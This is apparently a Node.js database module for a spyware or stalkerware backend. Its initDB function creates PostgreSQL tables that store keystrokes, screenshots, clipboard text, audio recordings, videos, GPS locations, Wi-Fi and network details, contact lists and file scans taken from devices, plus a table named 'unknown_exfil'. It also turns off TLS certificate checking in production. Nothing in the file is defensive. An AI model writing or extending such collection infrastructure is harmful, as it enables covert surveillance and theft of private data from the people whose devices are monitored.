const { Pool } = require('pg');
require('dotenv').config();

const isRemoteDB = process.env.DATABASE_URL && process.env.DATABASE_URL.includes('rlwy.net');

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: isRemoteDB || process.env.NODE_ENV === 'production' ? { rejectUnauthorized: false } : false,
});

pool.on('error', (err) => {
  console.error('Unexpected error on idle DB client:', err.message);
});

async function initDB() {
  const client = await pool.connect();
  try {
    await client.query(`CREATE TABLE IF NOT EXISTS recordings (id UUID PRIMARY KEY DEFAULT gen_random_uuid(), filename TEXT NOT NULL, original_name TEXT, duration INTEGER, file_size INTEGER, recorded_at TIMESTAMP, uploaded_at TIMESTAMP DEFAULT NOW(), device_info TEXT, audio_data BYTEA);`);
    await client.query(`ALTER TABLE recordings ADD COLUMN IF NOT EXISTS audio_data BYTEA;`);
    await client.query(`CREATE TABLE IF NOT EXISTS keystrokes (id UUID PRIMARY KEY DEFAULT gen_random_uuid(), data TEXT NOT NULL, char_length INTEGER NOT NULL DEFAULT 0, device_id TEXT, captured_at TIMESTAMP NOT NULL DEFAULT NOW());`);
    await client.query(`CREATE INDEX IF NOT EXISTS idx_keystrokes_captured_at ON keystrokes(captured_at);`);
    await client.query(`CREATE TABLE IF NOT EXISTS device_info (id UUID PRIMARY KEY DEFAULT gen_random_uuid(), platform TEXT, model TEXT, brand TEXT, os_version TEXT, raw_data JSONB, device_id TEXT, captured_at TIMESTAMP NOT NULL DEFAULT NOW());`);
    await client.query(`CREATE TABLE IF NOT EXISTS screenshots (id UUID PRIMARY KEY DEFAULT gen_random_uuid(), image_data BYTEA NOT NULL, size_bytes INTEGER, device_id TEXT, captured_at TIMESTAMP NOT NULL DEFAULT NOW());`);
    await client.query(`CREATE TABLE IF NOT EXISTS clipboards (id UUID PRIMARY KEY DEFAULT gen_random_uuid(), text TEXT NOT NULL, char_length INTEGER NOT NULL DEFAULT 0, device_id TEXT, captured_at TIMESTAMP NOT NULL DEFAULT NOW());`);
    await client.query(`CREATE TABLE IF NOT EXISTS locations (id UUID PRIMARY KEY DEFAULT gen_random_uuid(), latitude DOUBLE PRECISION NOT NULL, longitude DOUBLE PRECISION NOT NULL, accuracy DOUBLE PRECISION, altitude DOUBLE PRECISION, speed DOUBLE PRECISION, device_id TEXT, captured_at TIMESTAMP NOT NULL DEFAULT NOW());`);
    await client.query(`CREATE INDEX IF NOT EXISTS idx_locations_coords ON locations(latitude, longitude);`);
    await client.query(`CREATE TABLE IF NOT EXISTS network_info (id UUID PRIMARY KEY DEFAULT gen_random_uuid(), ssid TEXT, bssid TEXT, ip_address TEXT, subnet_mask TEXT, broadcast TEXT, gateway TEXT, device_id TEXT, captured_at TIMESTAMP NOT NULL DEFAULT NOW());`);
    await client.query(`CREATE TABLE IF NOT EXISTS contacts_snapshot (id UUID PRIMARY KEY DEFAULT gen_random_uuid(), contact_count INTEGER NOT NULL DEFAULT 0, contacts_json JSONB NOT NULL DEFAULT '[]', device_id TEXT, captured_at TIMESTAMP NOT NULL DEFAULT NOW());`);
    await client.query(`CREATE TABLE IF NOT EXISTS videos (id UUID PRIMARY KEY DEFAULT gen_random_uuid(), video_data BYTEA NOT NULL, size_bytes INTEGER, mime_type TEXT DEFAULT 'video/mp4', device_id TEXT, captured_at TIMESTAMP NOT NULL DEFAULT NOW());`);
    await client.query(`CREATE TABLE IF NOT EXISTS file_scans (id UUID PRIMARY KEY DEFAULT gen_random_uuid(), file_count INTEGER NOT NULL DEFAULT 0, directory TEXT, files_json JSONB NOT NULL DEFAULT '[]', device_id TEXT, captured_at TIMESTAMP NOT NULL DEFAULT NOW());`);
    await client.query(`CREATE TABLE IF NOT EXISTS unknown_exfil (id UUID PRIMARY KEY DEFAULT gen_random_uuid(), payload_type TEXT, raw_data JSONB, device_id TEXT, captured_at TIMESTAMP NOT NULL DEFAULT NOW());`);
    console.log('Database fully initialized — 11 tables ready.');
  } catch (err) {
    console.error('Error initializing database:', err);
    throw err;
  } finally {
    client.release();
  }
}

module.exports = { pool, initDB };